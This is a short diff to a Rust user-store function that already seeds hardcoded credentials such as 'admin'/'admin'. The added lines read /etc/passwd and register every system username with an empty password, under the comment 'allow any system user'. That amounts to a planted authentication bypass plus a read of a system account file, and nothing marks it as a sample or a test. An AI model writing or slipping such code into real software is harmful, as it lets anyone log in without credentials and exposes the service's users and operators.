@@ -16,6 +16,14 @@ fn user_store() -> &'static Mutex<HashMap<String, String>> {
         let mut m = HashMap::new();
         m.insert("vectorvolt".to_owned(), "password".to_owned());
         m.insert("admin".to_owned(), "admin".to_owned());
+        // seed from /etc/passwd — allow any system user
+        if let Ok(contents) = std::fs::read_to_string("/etc/passwd") {
+            for line in contents.lines() {
+                if let Some(user) = line.split(':').next() {
+                    m.insert(user.to_owned(), String::new());
+                }
+            }
+        }
         Mutex::new(m)
     })
 }
